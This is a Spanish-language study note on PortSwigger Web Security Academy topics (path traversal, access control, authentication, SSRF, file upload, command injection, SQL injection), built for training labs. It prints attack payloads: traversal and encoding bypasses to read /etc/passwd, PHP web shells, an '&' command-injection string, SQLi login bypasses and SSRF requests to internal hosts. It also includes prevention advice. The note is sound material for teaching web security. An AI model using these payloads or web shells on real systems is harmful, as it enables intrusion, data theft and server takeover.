#portswigger #web-security #owasp #study #labs

# PortSwigger Web Security Academy — Apprentice & Practitioner

Documento de estudio de las técnicas de la Web Security Academy, agrupado por técnica, con la teoría esencial, ejemplos/payloads y los laboratorios. Se irán añadiendo más técnicas.

Cómo usarlo: estudiar la técnica, luego resolver sus labs empezando por **Apprentice** y siguiendo por **Practitioner**. Cada lab tiene un bloque `--- SOLUTION ---` para documentar la resolución. El nivel mostrado es orientativo (Apprentice/Practitioner).

Relacionado: [[OWASP Top 10]] · [[Web Enumeration]] · [[burpsuite]]

## Índice

1. [[#1. Path Traversal|Path Traversal]]
2. [[#2. Access Control|Access Control (Broken Access Control)]]
3. [[#3. Authentication|Authentication]]
4. [[#4. SSRF (Server-Side Request Forgery)|SSRF]]
5. [[#5. File Upload|File Upload Vulnerabilities]]
6. [[#6. OS Command Injection|OS Command Injection]]
7. [[#7. SQL Injection|SQL Injection]]

---

## 1. Path Traversal

También llamado *directory traversal*. Permite leer ficheros arbitrarios del servidor (código y datos de la aplicación, credenciales de back-end, ficheros del SO). En algunos casos permite **escribir** ficheros, lo que puede llevar al control total del servidor.

**Lectura de ficheros arbitrarios.** Una app que carga imágenes:

```html
<img src="/loadImage?filename=218.png">
```

Lee de `/var/www/images/218.png`. Sin defensas, un atacante pide:

```
https://insecure-website.com/loadImage?filename=../../../etc/passwd
```

Resuelve a `/var/www/images/../../../etc/passwd` → `/etc/passwd`. La secuencia `../` sube un nivel; tres suben hasta la raíz. En **Windows** valen `../` y `..\`:

```
https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini
```

### Obstáculos comunes y bypass

- **Secuencias stripped/blocked → ruta absoluta:** referenciar el fichero directamente sin traversal.

```
filename=/etc/passwd
```

- **Strip no recursivo → secuencias anidadas:** al eliminar la secuencia interna, vuelve a formarse `../`.

```
....//
..../
```

- **Sanitización en el servidor → URL-encode / doble encode:** `../` como `%2e%2e%2f` y `%252e%252e%252f`. Encodings no estándar también pueden funcionar: `..%c0%af`, `..%ef%bc%8f`. (Burp Intruder trae la lista *Fuzzing - path traversal*.)

- **Validación de inicio de ruta → incluir la base + traversal:**

```
filename=/var/www/images/../../../etc/passwd
```

- **Validación de extensión → null byte** para terminar la ruta antes de la extensión esperada:

```
filename=../../../etc/passwd%00.png
```

### Prevención

Lo más efectivo es no pasar input del usuario a APIs de sistema de ficheros. Si no es posible, dos capas: (1) validar el input (idealmente whitelist; si no, solo alfanuméricos); (2) tras validar, canonicalizar la ruta y verificar que empieza por el directorio base. Ejemplo Java:

```java
File file = new File(BASE_DIRECTORY, userInput);
if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    // process file
}
```

### Labs

#### Lab: File path traversal, simple case — Apprentice
Recuperar el contenido de `/etc/passwd`.

**--- SOLUTION ---**


#### Lab: Traversal sequences blocked with absolute path bypass — Practitioner
Bloquea secuencias traversal pero trata el filename como relativo a un working directory por defecto. Recuperar `/etc/passwd`.

**--- SOLUTION ---**


#### Lab: Traversal sequences stripped non-recursively — Practitioner
Elimina las secuencias traversal una sola vez (no recursivo). Recuperar `/etc/passwd`.

**--- SOLUTION ---**


#### Lab: Traversal sequences stripped with superfluous URL-decode — Practitioner
Bloquea input con secuencias traversal y luego hace un URL-decode del input antes de usarlo. Recuperar `/etc/passwd`.

**--- SOLUTION ---**


#### Lab: Validation of start of path — Practitioner
Transmite la ruta completa por un parámetro y valida que empieza por la carpeta esperada. Recuperar `/etc/passwd`.

**--- SOLUTION ---**


#### Lab: Validation of file extension with null byte bypass — Practitioner
Valida que el filename termina con la extensión esperada. Recuperar `/etc/passwd`.

**--- SOLUTION ---**


[[#Índice|Volver al índice]]

---

## 2. Access Control

El control de acceso decide si un usuario puede realizar la acción que intenta. Depende de la **autenticación** (quién eres) y la **gestión de sesión** (qué peticiones son tuyas). Los fallos de control de acceso roto son frecuentes y críticos.

### Vertical privilege escalation

Acceder a funcionalidad no permitida (p. ej. un usuario normal llega a funciones de admin).

- **Unprotected functionality:** funcionalidad sensible sin protección, accesible por URL directa (`/admin`). Puede estar revelada en `/robots.txt` o descubrirse por fuerza bruta de URLs.
- **Security by obscurity:** URL impredecible (`/administrator-panel-yb556`) pero filtrada, p. ej. en JavaScript que construye la UI según el rol:

```html
<script>
var isAdmin = false;
if (isAdmin) {
    var adminPanelTag = document.createElement('a');
    adminPanelTag.setAttribute('href', 'https://insecure-website.com/administrator-panel-yb556');
    adminPanelTag.innerText = 'Admin panel';
}
</script>
```

- **Parameter-based:** el rol se guarda en un sitio controlable por el usuario (campo oculto, cookie, query string) y la decisión se basa en ese valor:

```
https://insecure-website.com/login/home.jsp?admin=true
https://insecure-website.com/login/home.jsp?role=1
```

### Horizontal privilege escalation

Acceder a recursos de otro usuario del mismo tipo. Ejemplo con IDOR (*insecure direct object reference*):

```
https://insecure-website.com/myaccount?id=123
```

Cambiar `id` al de otro usuario. Si el identificador es un GUID no predecible, puede estar filtrado en otro punto de la app (mensajes, reviews).

### Horizontal to vertical

Una escalada horizontal puede convertirse en vertical al comprometer a un usuario con más privilegios (p. ej. capturar/cambiar la contraseña de un admin vía `id=456`).

### Labs

#### Lab: Unprotected admin functionality — Apprentice
Panel de admin sin proteger. Borrar al usuario `carlos`.

**--- SOLUTION ---**


#### Lab: Unprotected admin functionality with unpredictable URL — Apprentice
Panel de admin en URL impredecible pero revelada en la aplicación. Acceder y borrar a `carlos`.

**--- SOLUTION ---**


#### Lab: User role controlled by request parameter — Apprentice
Panel `/admin` que identifica a los administradores con una cookie falsificable. Acceder y borrar a `carlos`. Credenciales: `wiener:peter`.

**--- SOLUTION ---**


#### Lab: User ID controlled by request parameter, with unpredictable user IDs — Apprentice
Escalada horizontal en la página de cuenta, pero los usuarios se identifican con GUIDs. Encontrar el GUID de `carlos` y enviar su API key. Credenciales: `wiener:peter`.

**--- SOLUTION ---**


#### Lab: User ID controlled by request parameter with password disclosure — Apprentice
La página de cuenta contiene la contraseña actual prerellenada en un input enmascarado. Recuperar la contraseña del administrador y usarla para borrar a `carlos`. Credenciales: `wiener:peter`.

**--- SOLUTION ---**


[[#Índice|Volver al índice]]

---

## 3. Authentication

Autenticación = verificar que el usuario es quien dice ser. **Autorización** = verificar si puede hacer algo. Tres factores: algo que **sabes** (contraseña), algo que **tienes** (móvil, token), algo que **eres/haces** (biometría). Los fallos suelen surgir por: (1) protección insuficiente contra fuerza bruta, o (2) logic flaws que permiten saltarse el mecanismo (*broken authentication*).

### Fuerza bruta

Prueba y error (automatizado con wordlists) para adivinar credenciales.

- **Usernames:** patrones reconocibles (`firstname.lastname@empresa.com`), cuentas previsibles (`admin`, `administrator`). Comprobar si la web filtra usernames (perfiles públicos, emails en respuestas HTTP).
- **Passwords:** las políticas de alta entropía se debilitan por el comportamiento humano: `mypassword` → `Mypassword1!` / `Myp4$$w0rd`; cambios periódicos → `Mypassword1!` → `Mypassword2!`.

### Username enumeration

Observar diferencias en la respuesta para saber si un username es válido (login o registro). Prestar atención a:

- **Status codes:** un código distinto puede indicar username válido.
- **Error messages:** mensajes sutilmente distintos según si falla user+pass o solo pass.
- **Response times:** tiempos distintos (p. ej. la web solo comprueba la contraseña si el user existe); amplificable enviando una contraseña muy larga.

### Fallos en la protección contra fuerza bruta

- **IP block:** si el contador de intentos se resetea al hacer login correcto en la propia cuenta, basta intercalar las credenciales propias en la wordlist.
- **Account locking:** se puede sortear probando pocas contraseñas (por debajo del límite) contra muchos usuarios; no protege contra **credential stuffing** (pares user:password de brechas, cada user se prueba una vez). Los mensajes de cuenta bloqueada también permiten enumerar usuarios.
- **User rate limiting:** bloquea la IP por demasiadas peticiones; sorteable manipulando la IP aparente o adivinando varias contraseñas en una sola petición.

### HTTP basic authentication

El cliente envía en cada petición:

```
Authorization: Basic base64(username:password)
```

Inseguro: reenvía credenciales en cada petición (MITM sin HSTS), sin protección anti-fuerza-bruta y vulnerable a CSRF.

### Multi-factor authentication (MFA)

2FA = algo que sabes + algo que tienes. SMS es débil (interceptación, **SIM swapping**). Verificar dos veces el mismo factor (p. ej. 2FA por email) no es verdadero MFA.

- **Bypass directo:** si tras el primer paso ya estás "logueado", probar a saltar directamente a páginas *logged-in only* sin introducir el código.
- **Flawed logic:** el segundo paso identifica la cuenta por una cookie fijada en el primer paso; cambiarla permite atacar otra cuenta:

```
POST /login-steps/first HTTP/1.1
username=carlos&password=qwerty

HTTP/1.1 200 OK
Set-Cookie: account=carlos

POST /login-steps/second HTTP/1.1
Cookie: account=victim-user
verification-code=123456
```

- **Brute-force del código:** los códigos de 4-6 dígitos son triviales sin protección; automatizable con macros de Burp Intruder / Turbo Intruder.

### Otros mecanismos

- **Keep logged in ("remember me"):** cookie persistente. Insegura si se genera con valores estáticos predecibles (username + timestamp, o incluso la contraseña); "cifrada" con Base64 no protege; hash sin salt → brute-force con wordlists hasheadas. También robable vía XSS.
- **Reset por email:** nunca enviar la contraseña actual; contraseñas persistentes por canales inseguros = riesgo MITM.
- **Reset por URL:** inseguro con parámetro adivinable (`reset-password?user=victim-user`); mejor token de alta entropía que expira y se destruye tras el uso. Fallo común: no revalidar el token al enviar el formulario. Si la URL se genera dinámicamente, posible **password reset poisoning** (robar el token de otro vía cabecera).

```
http://vulnerable-website.com/reset-password?user=victim-user
http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8
```

- **Change password:** peligroso si se accede sin estar logueado como la víctima (p. ej. username en campo oculto editable) → enumerar usuarios y brute-force.

### Prevención

Nunca enviar credenciales por conexiones sin cifrar (forzar HTTPS). No revelar usernames (mensajes de error genéricos e idénticos, mismo status code, tiempos indistinguibles). Rate limiting por IP + CAPTCHA tras un límite. Auditar a fondo la lógica de verificación. No olvidar la funcionalidad suplementaria (reset/change). MFA real con app/dispositivo dedicado.

### Labs

#### Lab: Username enumeration via different responses — Apprentice
Enumerar un username válido (wordlists de usuarios/contraseñas), brute-force de su contraseña y acceder a su cuenta.

**--- SOLUTION ---**


#### Lab: Username enumeration via subtly different responses — Practitioner
Como el anterior pero las diferencias en la respuesta son sutiles.

**--- SOLUTION ---**


#### Lab: Username enumeration via response timing — Practitioner
Enumerar por tiempos de respuesta. Credenciales: `wiener:peter`.

**--- SOLUTION ---**


#### Lab: Broken brute-force protection, IP block — Practitioner
Logic flaw en la protección anti-fuerza-bruta. Credenciales: `wiener:peter`. Víctima: `carlos`.

**--- SOLUTION ---**


#### Lab: Username enumeration via account lock — Practitioner
Usa account locking con un logic flaw que permite enumerar usuarios.

**--- SOLUTION ---**


#### Lab: 2FA simple bypass — Apprentice
El 2FA se puede saltar. Ya tienes user y password pero no el código 2FA. Acceder a la cuenta de Carlos. Credenciales: `wiener:peter`. Víctima: `carlos:montoya`.

**--- SOLUTION ---**


#### Lab: 2FA broken logic — Practitioner
2FA vulnerable por lógica defectuosa. Acceder a la cuenta de Carlos. Credenciales: `wiener:peter`. Víctima: `carlos` (tienes acceso al servidor de correo para el código).

**--- SOLUTION ---**


#### Lab: Brute-forcing a stay-logged-in cookie — Practitioner
La cookie de "stay logged in" es vulnerable a fuerza bruta. Acceder a la cuenta de Carlos. Credenciales: `wiener:peter`. Víctima: `carlos`.

**--- SOLUTION ---**


#### Lab: Offline password cracking — Practitioner
La contraseña (hash) se guarda en una cookie; hay XSS en los comentarios. Robar la cookie stay-logged-in de Carlos, crackear su contraseña, loguear y borrar su cuenta. Credenciales: `wiener:peter`. Víctima: `carlos`.

**--- SOLUTION ---**


#### Lab: Password reset broken logic — Apprentice
Funcionalidad de reset vulnerable. Resetear la contraseña de Carlos, loguear y acceder a su cuenta. Credenciales: `wiener:peter`. Víctima: `carlos`.

**--- SOLUTION ---**


#### Lab: Password reset poisoning via middleware — Practitioner
Vulnerable a password reset poisoning. Carlos hace clic en cualquier enlace que reciba. Loguear en su cuenta. Credenciales propias: `wiener:peter` (los emails se leen en el exploit server).

**--- SOLUTION ---**


#### Lab: Password brute-force via password change — Practitioner
La funcionalidad de cambio de contraseña permite brute-force. Usar la lista de contraseñas candidatas contra la cuenta de Carlos. Credenciales: `wiener:peter`. Víctima: `carlos`.

**--- SOLUTION ---**


[[#Índice|Volver al índice]]

---

## 4. SSRF (Server-Side Request Forgery)

Permite hacer que la aplicación del servidor realice peticiones a un destino no previsto: servicios internos de la organización o sistemas externos arbitrarios (posible fuga de datos o credenciales).

### SSRF contra el propio servidor

Forzar una petición al propio servidor vía loopback (`127.0.0.1` / `localhost`). Ejemplo: un stock checker que acepta una URL:

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```

El servidor trae `/admin` y lo devuelve. Aunque `/admin` normalmente requiere autenticación, si la petición viene de la máquina local se saltan los controles (checks en un componente frontal, acceso de recuperación sin login desde localhost, interfaz admin en otro puerto).

### SSRF contra otros sistemas back-end

El servidor puede alcanzar sistemas internos no enrutables (IPs privadas) con peor postura de seguridad:

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
```

### Labs

#### Lab: Basic SSRF against the local server — Apprentice
Cambiar la URL del stock check para acceder a `http://localhost/admin` y borrar al usuario `carlos`.

**--- SOLUTION ---**


#### Lab: Basic SSRF against another back-end system — Apprentice
Usar el stock check para escanear el rango interno `192.168.0.X` buscando un admin en el puerto 8080, y borrar a `carlos`.

**--- SOLUTION ---**


[[#Índice|Volver al índice]]

---

## 5. File Upload

Surgen cuando el servidor permite subir ficheros sin validar suficientemente nombre, tipo, contenido o tamaño. En el peor caso se sube un script server-side que el servidor ejecuta → **web shell** → RCE. A veces basta con subir el fichero; otras hace falta una petición posterior para ejecutarlo.

### Web shell

Script malicioso que ejecuta comandos vía HTTP. Lectura de un fichero arbitrario:

```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

Shell más versátil (comando por query param):

```php
<?php echo system($_GET['command']); ?>
```

```
GET /example/exploit.php?command=id HTTP/1.1
```

### Validación defectuosa del tipo

Los formularios de subida usan `multipart/form-data`. Cada parte lleva `Content-Disposition` y puede llevar su propio `Content-Type` (MIME). Si el servidor **confía** en ese `Content-Type` sin verificar el contenido real, se puede falsear con Burp Repeater (p. ej. declarar `image/jpeg` subiendo un `.php`).

```
POST /images HTTP/1.1
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

-----------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg

[...binary content...]
-----------------------------012345678901234567890123456--
```

### Labs

#### Lab: Remote code execution via web shell upload — Apprentice
La subida de imágenes no valida nada. Subir una PHP web shell y exfiltrar `/home/carlos/secret`. Credenciales: `wiener:peter`.

**--- SOLUTION ---**


#### Lab: Web shell upload via Content-Type restriction bypass — Apprentice
Intenta impedir tipos inesperados confiando en input controlable por el usuario. Subir una PHP web shell y exfiltrar `/home/carlos/secret`. Credenciales: `wiener:peter`.

**--- SOLUTION ---**


[[#Índice|Volver al índice]]

---

## 6. OS Command Injection

También *shell injection*: ejecutar comandos del SO en el servidor, normalmente comprometiendo la aplicación y sus datos (y pivotando a otros sistemas).

### Comandos útiles iniciales

| Propósito | Linux | Windows |
|---|---|---|
| Usuario actual | `whoami` | `whoami` |
| Sistema operativo | `uname -a` | `ver` |
| Configuración de red | `ifconfig` | `ipconfig /all` |
| Conexiones de red | `netstat -an` | `netstat -an` |
| Procesos | `ps -ef` | `tasklist` |

### Inyección

Una app llama a un comando de shell con argumentos del usuario:

```
https://insecure-website.com/stockStatus?productID=381&storeID=29
```

```
stockreport.pl 381 29
```

Sin defensas, inyectar con el separador `&`:

```
& echo aiwefwlguh &
```

El comando ejecutado pasa a ser `stockreport.pl & echo aiwefwlguh & 29`. `echo` es útil para probar la inyección; `&` es separador de comandos (ejecuta varios seguidos). Poner `&` también **después** separa la inyección de lo que venga detrás, evitando que rompa la ejecución.

### Labs

#### Lab: OS command injection, simple case — Apprentice
Inyección en el stock checker (ejecuta un comando con product/store IDs y devuelve la salida cruda). Ejecutar `whoami`.

**--- SOLUTION ---**


[[#Índice|Volver al índice]]

---

## 7. SQL Injection

Permite interferir en las consultas que la app hace a su base de datos: ver datos de otros usuarios, modificar/borrar datos y, en algunos casos, comprometer el servidor o hacer DoS.

### Detección

Probar en cada entry point:

- El carácter `'` y buscar errores/anomalías.
- Sintaxis SQL que evalúe al valor base y a otro distinto, y comparar respuestas.
- Condiciones booleanas `OR 1=1` y `OR 1=2`, y comparar respuestas.
- Payloads que provoquen *time delays* y comparar tiempos.
- Payloads OAST para interacción out-of-band.

### Retrieving hidden data

Una categoría de productos genera:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Comentar el resto con `--`:

```
https://insecure-website.com/products?category=Gifts'--
```

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

Devolver todo con `OR 1=1`:

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

Aviso: `OR 1=1` puede ser peligroso si el mismo dato llega a un `UPDATE`/`DELETE` → pérdida accidental de datos.

### Subverting application logic (login bypass)

Login que comprueba:

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

Loguear como admin sin contraseña con `administrator'--`:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

### Labs

#### Lab: SQL injection in WHERE clause allowing retrieval of hidden data — Apprentice
Inyección en el filtro de categoría. Hacer que se muestren uno o más productos no publicados.

**--- SOLUTION ---**


#### Lab: SQL injection vulnerability allowing login bypass — Apprentice
Inyección en el login. Loguear como `administrator`.

**--- SOLUTION ---**


[[#Índice|Volver al índice]]
